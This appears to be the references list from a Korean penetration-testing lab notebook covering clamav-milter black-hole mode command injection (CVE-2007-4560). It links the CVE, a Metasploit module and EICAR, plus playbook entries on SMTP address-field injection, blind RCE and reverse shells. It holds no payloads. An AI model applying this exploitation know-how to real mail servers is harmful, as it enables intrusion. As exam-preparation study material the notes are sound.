- [CVE-2007-4560](https://nvd.nist.gov/vuln/detail/CVE-2007-4560) — clamav-milter black hole 모드 명령 주입. NVD 는 `before 0.91.2`, Rapid7 모듈 설명은 `prior to v0.92.2` 로 적음. 어느 쪽이든 0.91 은 취약
- Metasploit `exploit/unix/smtp/clamav_milter_blackhole` — 같은 취약점. 모듈 소스 주석이 milter 작업 디렉터리와 `msg.*` 동작을 설명함. 시험에서는 1대 한정이므로 수동 절차를 먼저 익힐 것
- EICAR 테스트 문자열 — AV 동작 확인용 표준. 실제 악성코드가 아님
- [[Bratarina]] — 같은 SMTP 주소 필드 주입 계열(OpenSMTPD, CVE-2020-7247). 거기서는 프로토콜이 `|` 를 `:` 로 재작성해 스테이저가 조용히 실패했음. **주소 필드 주입은 문자 제약을 먼저 계측하라**가 양쪽에 겹침
- [[Cockpit]] — 박스 이름을 믿고 판 함정. 여기서는 이름이 맞았으나, 맞은 것을 확인한 근거는 이름이 아니라 EICAR 응답이었음
- [[Hub]] · [[Levram]] · [[Squid]] — 버전 판정 독립 근거 2개
- [[Crane]] · [[RubyDome]] · [[Squid]] — 응답이 성공을 뜻하지 않는다
- [[Flu]] — 인스턴스마다 플래그가 새로 생성된다는 실측
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]
- [[_PLAYBOOK#B-23. OpenSMTPD MAIL FROM 로컬파트 검증 우회 — CVE-2020-7247]] · [[_PLAYBOOK#B-83. 타겟에 `curl` 이 없을 수 있다 — 전송 도구부터 확인]] · [[_PLAYBOOK#C-1. 정찰 직후]]
- [[_PLAYBOOK#A-39. 블라인드 RCE 는 되는데 셸이 안 붙는다 — 채널 제약(대소문자·길이·cwd)부터 계측한다]] · [[_PLAYBOOK#B-2-11. clamav-milter black-hole 모드 RCPT TO 명령 주입 — CVE-2007-4560]] · [[_PLAYBOOK#B-87. 블라인드 RCE 의 오라클은 «내 HTTP 서버 액세스 로그»다]]
- [[_STATUS]]
